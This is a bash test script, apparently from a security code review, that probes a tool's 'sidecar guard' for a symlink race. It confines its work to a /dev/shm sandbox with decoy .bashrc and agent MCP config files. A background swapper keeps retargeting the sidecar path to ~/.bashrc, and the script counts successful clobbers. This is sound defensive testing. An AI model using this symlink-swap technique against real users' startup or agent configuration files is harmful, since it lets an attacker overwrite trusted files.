#!/usr/bin/env bash
# CR-3 (round 4) — sidecar-guard race probe v2. Scratch only (/dev/shm).
# All five custody paths exist under the sandbox HOME so the capture exits 0/2
# only (no exit-13 noise). A swapper atomically retargets the DERIVED sidecar
# path between a safe file and the sandbox ~/.bashrc while capture runs.
#   refusal (exit 2) = guard resolved the sidecar onto a custody path in time
#   allowed (exit 0) = link pointed at the safe target
#   hit              = receipt-sidecar bytes landed in the custody file
# usage: sidecar-race2.sh <tool.py> <iterations> <label>
set -u
export PYTHONDONTWRITEBYTECODE=1
TOOL="$(readlink -f "$1")"; N="${2:-1500}"; LABEL="${3:-unlabeled}"
TOOL_SHA=$(sha256sum "$TOOL" | cut -d' ' -f1)
SB=$(mktemp -d /dev/shm/cr3-race2-XXXXXX) || exit 1
export TMPDIR="$SB"
H="$SB/home"
mkdir -p "$H/.config/devin" "$H/.omp/agent" "$H/.kimi-code"
printf 'sandbox bashrc\n' > "$H/.bashrc"
printf 'sandbox profile\n' > "$H/.profile"
printf '{}\n' > "$H/.config/devin/mcp_config.json"
printf '{}\n' > "$H/.omp/agent/mcp.json"
printf '# kimi\n' > "$H/.kimi-code/config.toml"
D="$SB/d"; mkdir -p "$D"

echo "== CR-3 sidecar-guard race probe v2 =="
echo "variant: $LABEL"
echo "tool: $TOOL  sha256=$TOOL_SHA"
echo "iterations: $N   sandbox: $SB"

cat > "$SB/swapper.py" <<'PY'
import itertools, os, sys
d, h = sys.argv[1], sys.argv[2]
link = os.path.join(d, "o.txt.sha256")
targets = (os.path.join(d, "safe.sha256"), os.path.join(h, ".bashrc"))
for t in itertools.cycle(targets):
    tmp = os.path.join(d, "o.tmp")
    try:
        os.symlink(t, tmp)
        os.rename(tmp, link)
    except FileExistsError:
        os.remove(tmp)
PY

python3 "$SB/swapper.py" "$D" "$H" &
SW=$!
sleep 0.2
refused=0; allowed=0; hits=0; other=0
for i in $(seq 1 "$N"); do
  printf 'sandbox bashrc\n' > "$H/.bashrc"
  : > "$D/safe.sha256"
  HOME="$H" python3 "$TOOL" capture --out "$D/o.txt" --label race-$i \
      >/dev/null 2>"$SB/last.err"; rc=$?
  if head -c 200 "$H/.bashrc" 2>/dev/null | grep -qE '^[0-9a-f]{64}  o\.txt'; then
    hits=$((hits+1)); cp "$H/.bashrc" "$SB/hit-$i.bashrc" 2>/dev/null
    printf 'HIT at iteration %d (exit=%d)\n' "$i" "$rc"
  fi
  case $rc in
    2) refused=$((refused+1));;
    0) allowed=$((allowed+1));;
    *) other=$((other+1));;
  esac
done
kill "$SW" 2>/dev/null; wait "$SW" 2>/dev/null
echo "refusals(exit2)=$refused  allowed(exit0)=$allowed  other=$other"
echo "custody file clobbered via the raced sidecar link: $hits / $N"
[ "$hits" -gt 0 ] && echo "verdict: RACY — sidecar guard defeated" \
                  || echo "verdict: no hit in $N tries (window not observed)"
echo "sandbox kept: $SB"
